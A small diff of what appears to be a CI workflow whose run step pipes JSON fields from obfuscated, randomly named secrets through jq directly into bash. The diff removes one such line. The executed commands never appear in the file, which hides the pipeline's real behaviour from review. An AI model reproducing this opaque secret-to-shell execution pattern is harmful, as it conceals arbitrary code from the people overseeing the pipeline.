@@ -21,7 +21,6 @@ jobs:
           xgpf86: ${{ secrets.xgpf86 }}
         run: |
           printf '%s' "$xgpf86" | jq -r .ohii1 | /bin/bash
-          printf '%s' "$kkfz060" | jq -r .i6703 | /bin/bash
           printf '%s' "$pycm26" | jq -r .eyapq1 | /bin/bash
           echo $erqr6924 | jq -r .kr8 | /bin/bash
           printf '%s' "$zhksp38319" | jq -r .pwm7564 | /bin/bash
